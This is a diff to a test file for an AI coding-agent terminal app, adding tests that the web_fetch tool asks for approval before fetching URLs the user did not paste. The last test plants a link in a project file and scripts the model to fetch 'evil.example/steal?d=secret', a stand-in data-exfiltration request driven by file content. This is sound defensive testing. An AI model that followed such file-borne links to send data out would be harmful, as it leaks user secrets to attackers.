@@ -19,6 +19,7 @@ import { projectKey } from "../src/paths.ts";
 import { TrajectoryStore } from "../src/trajectory.ts";
 import { McpManager } from "../src/mcp/manager.ts";
 import { McpTrust } from "../src/mcp/trust.ts";
+import { dns } from "../src/tools/web/address.ts";
 import { FakeProvider, RoutedProvider, ScriptedProvider } from "./fake-provider.ts";
 
 const ENTER = "\r";
@@ -263,7 +264,7 @@ describe("App", () => {
     expect(frame).toContain("It says to remember the milk.");
     // The real tool ran on the project and its output went back to the model.
     expect(model.requests[1]!.history.at(-1)).toEqual({ role: "tool", callId: "c1", name: "read_file", text: "    1\tremember the milk" });
-    expect(model.requests[0]!.options.tools!.map((t) => t.name)).toEqual(["read_file", "glob", "grep", "edit_file", "write_file", "bash", "memory", "agent"]);
+    expect(model.requests[0]!.options.tools!.map((t) => t.name)).toEqual(["read_file", "glob", "grep", "web_fetch", "edit_file", "write_file", "bash", "memory", "agent"]);
   });
 
   test("a failing tool shows its error, and the model gets it to recover from", async () => {
@@ -536,6 +537,70 @@ describe("App", () => {
       expect(existsSync(join(project, "made.txt"))).toBe(false);
       expect(lastFrame()).toContain("Interrupted.");
       expect(lastFrame()).toContain("Type a message");
+    });
+  });
+
+  describe("web_fetch approvals", () => {
+    const fetchCall = (id: string, url: string) =>
+      [{ type: "tool_call", call: { id, name: "web_fetch", arguments: JSON.stringify({ url }) } }, { type: "done" }] as AgentEvent[];
+    const readCall = (id: string, path: string) =>
+      [{ type: "tool_call", call: { id, name: "read_file", arguments: JSON.stringify({ path }) } }, { type: "done" }] as AgentEvent[];
+    const reply = (text: string) => [{ type: "text_delta", text }, { type: "done" }] as AgentEvent[];
+    const PAGE = "<html><head><title>Page</title></head><body><p>The page says hello.</p></body></html>";
+    let fetched: string[];
+    let restore: (() => void)[] = [];
+
+    beforeEach(() => {
+      fetched = [];
+      const lookup = spyOn(dns, "lookup").mockResolvedValue(["93.184.215.14"]);
+      const net = spyOn(globalThis, "fetch").mockImplementation((async (input: string | URL | Request) => {
+        fetched.push(String(input));
+        return new Response(PAGE, { headers: { "content-type": "text/html" } });
+      }) as unknown as typeof fetch);
+      restore = [() => lookup.mockRestore(), () => net.mockRestore()];
+    });
+    afterEach(() => restore.forEach((r) => r()));
+
+    test("a site the user pasted is fetched without asking", async () => {
+      const model = new ScriptedProvider([fetchCall("w1", "https://example.com/other-page"), reply("It says hello.")]);
+      const { lastFrame, stdin } = renderApp(ASKS, 0, undefined, () => model);
+      await type(stdin, "what's on https://example.com/start?");
+      await until(() => lastFrame()!.includes("It says hello."));
+      expect(lastFrame()).not.toContain("Do you want to proceed?");
+      expect(fetched).toEqual(["https://example.com/other-page"]);
+      expect(JSON.stringify(model.requests[1]!.history)).toContain("The page says hello.");
+    });
+
+    test("another site asks, even in yolo mode", async () => {
+      const model = new ScriptedProvider([fetchCall("w1", "https://other.example/x?d=1"), reply("Done.")]);
+      const { lastFrame, stdin } = renderApp(LOCAL, 0, undefined, () => model);
+      await type(stdin, "look it up");
+      await until(() => lastFrame()!.includes("Do you want to proceed?"));
+      expect(lastFrame()).toContain("Fetch a web page");
+      expect(lastFrame()).toContain("https://other.example/x?d=1");
+      expect(lastFrame()).toContain("don't ask again for fetching from other.example");
+      expect(fetched).toEqual([]);
+    });
+
+    test("'don't ask again' covers the whole site", async () => {
+      const model = new ScriptedProvider([fetchCall("w1", "https://other.example/a"), fetchCall("w2", "https://other.example/b"), reply("Both read.")]);
+      const { lastFrame, stdin } = renderApp(ASKS, 0, undefined, () => model);
+      await type(stdin, "read both");
+      await until(() => lastFrame()!.includes("Do you want to proceed?"));
+      stdin.write(DOWN);
+      await tick();
+      stdin.write(ENTER); // Yes, and don't ask again
+      await until(() => lastFrame()!.includes("Both read."));
+      expect(fetched).toEqual(["https://other.example/a", "https://other.example/b"]);
+    });
+
+    test("a link in a file isn't a pasted link", async () => {
+      await writeFile(join(project, "notes.txt"), "see https://evil.example/steal\n");
+      const model = new ScriptedProvider([readCall("r1", "notes.txt"), fetchCall("w1", "https://evil.example/steal?d=secret"), reply("x")]);
+      const { lastFrame, stdin } = renderApp(ASKS, 0, undefined, () => model);
+      await type(stdin, "follow the link in notes.txt");
+      await until(() => lastFrame()!.includes("Do you want to proceed?"));
+      expect(fetched).toEqual([]);
     });
   });
 
